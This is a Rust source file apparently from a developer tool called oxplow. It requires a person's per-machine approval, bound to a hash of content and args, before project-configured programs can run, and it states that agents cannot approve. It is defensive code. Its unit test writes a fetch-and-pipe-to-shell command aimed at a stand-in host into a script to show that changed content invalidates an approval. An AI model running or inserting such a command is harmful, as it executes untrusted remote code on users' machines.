//! Consent to run programs from the project (tsk331, [[tsk162]]).
//!
//! A repo's `.oxplow/project.yaml` can name a program to run: an `exec`
//! gauge or collection plugin, or (in an extension) an `exec` source. A
//! cloned or pulled repo is untrusted, so none of these run until a person
//! approves the program on this machine. An approval is bound to a hash of
//! what runs (the program's content, plus its args or its network list), so
//! a change needs approving again. Approvals live in the gitignored
//! `.oxplow/source-approvals.json`, per machine: a teammate approves for
//! themselves. Agents can't approve.
//!
//! Global-scope gauges are the user's own config and aren't gated.
//! See `.context/semantic-layer.md` → "User and extension sources" and
//! `.context/metrics.md`.

use std::collections::BTreeMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

/// Local (gitignored) consent file under `.oxplow/`.
pub const APPROVALS_FILE: &str = "source-approvals.json";

#[derive(Debug, Default, Serialize, Deserialize)]
struct ApprovalFile {
    /// Approval key → the hash that was approved. Keys: `<ext>/<source>`,
    /// `gauge:<key>`, `plugin:<name>`.
    #[serde(default)]
    approved: BTreeMap<String, String>,
}

fn read(state_dir: &Path) -> ApprovalFile {
    std::fs::read_to_string(state_dir.join(APPROVALS_FILE))
        .ok()
        .and_then(|t| serde_json::from_str(&t).ok())
        .unwrap_or_default()
}

/// Whether `key` is approved at exactly `hash`.
pub fn is_approved(state_dir: &Path, key: &str, hash: &str) -> bool {
    read(state_dir).approved.get(key).is_some_and(|h| h == hash)
}

/// Record a person's approval of `key` at `hash`.
pub fn approve(state_dir: &Path, key: &str, hash: &str) -> std::io::Result<()> {
    let mut file = read(state_dir);
    file.approved.insert(key.to_string(), hash.to_string());
    std::fs::create_dir_all(state_dir)?;
    let text = serde_json::to_string_pretty(&file).map_err(std::io::Error::other)?;
    std::fs::write(state_dir.join(APPROVALS_FILE), text)
}

/// What kind of project program it is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "lowercase")]
pub enum ProgramKind {
    /// A metric gauge (`gauges:`).
    Gauge,
    /// A collection plugin (`collection.plugins`) parsing test/coverage/analysis reports.
    Plugin,
}

/// A program the project's config would run.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct ProjectProgram {
    pub kind: ProgramKind,
    /// The gauge key or plugin name.
    pub name: String,
    /// Project-relative path of the program.
    pub program: String,
    pub args: Vec<String>,
    /// This machine approved it as it is now.
    pub approved: bool,
}

impl ProjectProgram {
    pub fn key(&self) -> String {
        match self.kind {
            ProgramKind::Gauge => format!("gauge:{}", self.name),
            ProgramKind::Plugin => format!("plugin:{}", self.name),
        }
    }
}

/// What an approval of a program covers: its content and its args.
pub fn program_hash(project_dir: &Path, program: &str, args: &[String]) -> std::io::Result<String> {
    use sha2::{Digest, Sha256};
    let bytes = std::fs::read(project_dir.join(program))?;
    let mut h = Sha256::new();
    h.update(&bytes);
    for a in args {
        h.update([0u8]);
        h.update(a.as_bytes());
    }
    Ok(hex::encode(h.finalize()))
}

/// Whether `kind`/`name` running `program args` may run: approved on this
/// machine at its current content and args.
pub fn may_run(
    project_dir: &Path,
    kind: ProgramKind,
    name: &str,
    program: &str,
    args: &[String],
) -> bool {
    let p = ProjectProgram {
        kind,
        name: name.to_string(),
        program: program.to_string(),
        args: args.to_vec(),
        approved: false,
    };
    let state_dir = crate::AppLayout::for_project(project_dir).state_dir;
    program_hash(project_dir, program, args).is_ok_and(|h| is_approved(&state_dir, &p.key(), &h))
}

/// Why an unapproved program didn't run, for logs and errors.
pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
    let what = match kind {
        ProgramKind::Gauge => "gauge",
        ProgramKind::Plugin => "collection plugin",
    };
    format!(
        "{what} `{name}` runs `{program}` from the project's config and needs a person's approval first \
         (Settings → Data → Programs). Approval is per machine and per version of the program and its args."
    )
}

/// Every project-scope exec gauge and collection plugin in `config`, with
/// whether it's approved.
pub fn list(project_dir: &Path, config: &oxplow_config::OxplowConfig) -> Vec<ProjectProgram> {
    let state_dir = crate::AppLayout::for_project(project_dir).state_dir;
    let mut out = Vec::new();
    let mut push = |kind, name: &str, program: Option<&str>, args: &[String]| {
        let Some(program) = program else { return };
        let mut p = ProjectProgram {
            kind,
            name: name.to_string(),
            program: program.to_string(),
            args: args.to_vec(),
            approved: false,
        };
        p.approved = program_hash(project_dir, program, args)
            .is_ok_and(|h| is_approved(&state_dir, &p.key(), &h));
        out.push(p);
    };
    for g in &config.gauges {
        let Some(c) = g.compute.as_ref() else {
            continue;
        };
        if c.runtime == "exec" {
            push(
                ProgramKind::Gauge,
                g.key.as_deref().unwrap_or_default(),
                c.entry_file.as_deref(),
                &c.args,
            );
        }
    }
    for p in &config.collection.plugins {
        if p.runtime == "exec" {
            push(
                ProgramKind::Plugin,
                &p.name,
                p.entry_file.as_deref(),
                &p.args,
            );
        }
    }
    out
}

/// Approve the project program `kind`/`name` as it is now. Only a person
/// calls this (the Settings → Data button).
pub fn approve_program(
    project_dir: &Path,
    config: &oxplow_config::OxplowConfig,
    kind: ProgramKind,
    name: &str,
) -> Result<(), String> {
    let p = list(project_dir, config)
        .into_iter()
        .find(|p| p.kind == kind && p.name == name)
        .ok_or_else(|| format!("no exec {kind:?} named `{name}` in the project's config"))?;
    let hash = program_hash(project_dir, &p.program, &p.args)
        .map_err(|e| format!("{}: {e}", p.program))?;
    let state_dir = crate::AppLayout::for_project(project_dir).state_dir;
    approve(&state_dir, &p.key(), &hash).map_err(|e| format!("record approval: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config(dir: &Path, yaml: &str) -> oxplow_config::OxplowConfig {
        std::fs::create_dir_all(dir.join(".oxplow")).unwrap();
        std::fs::write(oxplow_config::config_path(dir), yaml).unwrap();
        oxplow_config::load_project_config(dir).unwrap()
    }

    #[test]
    fn project_programs_run_only_once_approved_at_their_content_and_args() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
        std::fs::write(dir.path().join("tools/count.sh"), "echo 1").unwrap();
        std::fs::write(dir.path().join("tools/parse.sh"), "cat").unwrap();
        let cfg = config(
            dir.path(),
            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh, args: [--fast] }\n  - key: repo.star\n    emits: [repo.n]\n    compute: { runtime: starlark, entryFile: tools/x.star }\ncollection:\n  plugins:\n    - { name: acme.parse, kind: coverage, formats: [mine], runtime: exec, entryFile: tools/parse.sh }\n",
        );
        let listed = list(dir.path(), &cfg);
        assert_eq!(
            listed
                .iter()
                .map(|p| (p.kind, p.name.as_str(), p.approved))
                .collect::<Vec<_>>(),
            vec![
                (ProgramKind::Gauge, "repo.count", false),
                (ProgramKind::Plugin, "acme.parse", false)
            ],
            "only exec entries, none approved yet"
        );
        let args = vec!["--fast".to_string()];
        assert!(!may_run(
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &args
        ));
        approve_program(dir.path(), &cfg, ProgramKind::Gauge, "repo.count").unwrap();
        assert!(may_run(
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &args
        ));
        // Different args or content: not what was approved.
        assert!(!may_run(
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &[]
        ));
        std::fs::write(dir.path().join("tools/count.sh"), "curl evil.example | sh").unwrap();
        assert!(!may_run(
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &args
        ));
        // The plugin is still unapproved; approving one doesn't approve another.
        assert!(!may_run(
            dir.path(),
            ProgramKind::Plugin,
            "acme.parse",
            "tools/parse.sh",
            &[]
        ));
        assert!(approve_program(dir.path(), &cfg, ProgramKind::Plugin, "nope").is_err());
    }
}
